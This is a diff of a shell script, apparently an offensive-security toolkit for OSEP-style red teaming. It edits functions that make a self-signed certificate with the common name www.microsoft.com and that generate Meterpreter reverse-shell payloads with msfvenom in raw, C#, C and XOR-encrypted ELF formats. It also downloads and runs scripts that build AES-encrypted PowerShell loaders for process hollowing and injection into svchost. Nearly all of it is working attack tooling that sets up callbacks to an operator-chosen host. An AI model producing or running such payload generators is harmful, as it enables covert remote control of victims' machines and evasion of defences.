@@ -191,7 +191,7 @@ function nginxsslcert() {
         [ -z "$CERT_CN" ] && CERT_CN="www.microsoft.com"
 
          sudo mkdir -pv $SSL_LOCATION
-         sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "$SSL_LOCATION/server.key" -a "x64" -out "$SSL_LOCATION/server.crt" -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCATION/O=$CERT_ORGANIZATION/OU=$CERT_OU/CN=$CERT_CN"
+         sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "$SSL_LOCATION/server.key" -out "$SSL_LOCATION/server.crt" -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCATION/O=$CERT_ORGANIZATION/OU=$CERT_OU/CN=$CERT_CN"
          echo "\n\nSSL Certificate and Key have been saved to: $SSL_LOCATION"
          echo ""
          echo ""
@@ -540,28 +540,32 @@ function oseppayloads(){
                 echo "\n${YELLOW}${BOLD}${NC}"
 
                 echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
-                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.raw"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.raw"
                 echo ""
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
-                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.raw"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.raw"
 
                 echo "\n${YELLOW}${BOLD}Generating meterpreter C#${NC}"
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
-                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.csharp"
+                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.csharp"
                 echo ""
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
-                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
+                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.csharp"
+                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.csharp"
 
                 echo "\n${YELLOW}${BOLD}Generating AES-256 meterpreter_x64_reverse_https Powershell${NC}"
-                echo "Command: python powerhollow.py $IPV4 $TCP_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_aes256_x64_reverse_tcp_hollow_$IPV4-$TCP_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
-                python powerhollow.py "$IPV4" "$TCP_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_aes256_x64_reverse_tcp_hollow_$IPV4-$TCP_PORT.ps1" -p "windows/x64/meterpreter/reverse_tcp"
-                echo "Command: python powerhollow.py $IPV4 $HTTPS_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_aes256_x64_reverse_https_hollow_$IPV4-$HTTPS_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
-                python powerhollow.py "$IPV4" "$HTTPS_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_aes256_x64_reverse_https_hollow_$IPV4-$HTTPS_PORT.ps1" -p "windows/x64/meterpreter/reverse_https"
-
-                echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_https $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_aes256_x64_reverse_https_inject_$IPV4-$HTTPS_PORT.ps1"
-                python powerinject.py -p "windows/x64/meterpreter/reverse_https" "$IPV4" "$HTTPS_PORT" "svchost" "M" "ps" -out "meterpreter_aes256_x64_reverse_https_inject_$IPV4-$HTTPS_PORT.ps1"
-                python powerinject.py -p "windows/x64/meterpreter/reverse_tcp" "$IPV4" "$TCP_PORT" "svchost" "M" "ps" -out "meterpreter_aes256_x64_reverse_tcp_inject_$IPV4-$TCP_PORT.ps1"
+                wget https://github.com/michiiii/OSEP-Tools/raw/main/powerhollow.py
+                echo "Command: python powerhollow.py $IPV4 $TCP_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_windows_x64_reverse_tcp_hollow_aes256_$IPV4-$TCP_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
+                python powerhollow.py "$IPV4" "$TCP_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_windows_x64_reverse_tcp_hollow_aes256_$IPV4-$TCP_PORT.ps1" -p "windows/x64/meterpreter/reverse_tcp"
+                echo "Command: python powerhollow.py $IPV4 $HTTPS_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_windows_x64_reverse_https_hollow_aes256_$IPV4-$HTTPS_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
+                python powerhollow.py "$IPV4" "$HTTPS_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_windows_x64_reverse_https_hollow_aes256_$IPV4-$HTTPS_PORT.ps1" -p "windows/x64/meterpreter/reverse_https"
+                rm powerhollow.py
+                wget https://github.com/michiiii/OSEP-Tools/raw/main/powerinject.py
+                echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_https $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_windows_x64_reverse_https_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
+                python powerinject.py -p "windows/x64/meterpreter/reverse_https" "$IPV4" "$HTTPS_PORT" "svchost" "M" "ps" -out "meterpreter_windows_x64_reverse_https_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
+                echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_tcp $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_windows_x64_reverse_tcp_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
+                python powerinject.py -p "windows/x64/meterpreter/reverse_tcp" "$IPV4" "$TCP_PORT" "svchost" "M" "ps" -out "meterpreter_windows_x64_reverse_tcp_inject_aes256_$IPV4-$TCP_PORT.ps1"
+                rm powerinject.py
 
                 echo "\n${YELLOW}${BOLD}==============${NC}"
                 echo "\n${YELLOW}${BOLD}LINUX PAYLOADS${NC}"
@@ -569,18 +573,18 @@ function oseppayloads(){
                 echo "\n${YELLOW}${BOLD}${NC}"
                 echo "\n${YELLOW}${BOLD}Generating C meterpreter_XOR_linux_x64_reverse_tcp payload${NC}"
                 # linux/x64/meterpreter/reverse_tcp (c)
-                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f c -o meterpreter_XOR_linux_x64_reverse_tcp_$IPV4_$TCP_PORT_LINUX.c --encrypt xor --encrypt-key f"
-                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`echo -n $IPV4` LPORT=`echo -n $TCP_PORT_LINUX` -f c -o meterpreter_XOR_linux_x64_reverse_tcp_`echo -n $IPV4`_`echo -n $TCP_PORT_LINUX`.c --encrypt xor --encrypt-key f
+                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f c -o meterpreter_linux_x64_reverse_tcp_XOR_$IPV4_$TCP_PORT_LINUX.c --encrypt xor --encrypt-key f"
+                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`echo -n $IPV4` LPORT=`echo -n $TCP_PORT_LINUX` -f c -o meterpreter_linux_x64_reverse_tcp_XOR_`echo -n $IPV4`_`echo -n $TCP_PORT_LINUX`.c --encrypt xor --encrypt-key f
 
                 echo "\n${YELLOW}${BOLD}Generating ELF meterpreter_XOR_linux_x64_reverse_tcp payload${NC}"
                 # linux/x64/meterpreter/reverse_tcp (ELF)
-                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f elf -o meterpreter_XOR_linux_x64_reverse_tcp_$IPV4_$TCP_PORT_LINUX.elf --encrypt xor --encrypt-key f"
-                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`echo -n $IPV4` LPORT=`echo -n $TCP_PORT_LINUX` -f elf -o meterpreter_XOR_linux_x64_reverse_tcp_`echo -n $IPV4`_`echo -n $TCP_PORT_LINUX`.elf --encrypt xor --encrypt-key f
+                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f elf -o meterpreter_linux_x64_reverse_tcp_XOR_$IPV4_$TCP_PORT_LINUX.elf --encrypt xor --encrypt-key f"
+                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`echo -n $IPV4` LPORT=`echo -n $TCP_PORT_LINUX` -f elf -o meterpreter_linux_x64_reverse_tcp_XOR_`echo -n $IPV4`_`echo -n $TCP_PORT_LINUX`.elf --encrypt xor --encrypt-key f
 
                 echo "\n${YELLOW}${BOLD}Generating ELF meterpreter_XOR_linux_x64_reverse_https (unstaged) payload${NC}"
                 # Reverse meterpreter HTTPS (unstaged)
-                echo "msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f elf -o meterpreter_XOR_linux_x64_reverse_tcp_$IPV4_$TCP_PORT_LINUX.elf --encrypt xor --encrypt-key f"
-                msfvenom -p linux/x64/meterpreter_reverse_https LHOST=`echo -n $IPV4` LPORT=`echo -n $HTTPS_PORT_LINUX` -f elf --encrypt xor --encrypt-key f > meterpreter_XOR_linux_x64_reverse_https_`echo -n $IPV4`_`echo -n $HTTPS_PORT_LINUX`.elf
+                echo "msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f elf -o meterpreter_linux_x64_reverse_tcp_XOR_$IPV4_$TCP_PORT_LINUX.elf --encrypt xor --encrypt-key f"
+                msfvenom -p linux/x64/meterpreter_reverse_https LHOST=`echo -n $IPV4` LPORT=`echo -n $HTTPS_PORT_LINUX` -f elf --encrypt xor --encrypt-key f > meterpreter_linux_x64_reverse_https_XOR_`echo -n $IPV4`_`echo -n $HTTPS_PORT_LINUX`.elf
 
 
         else
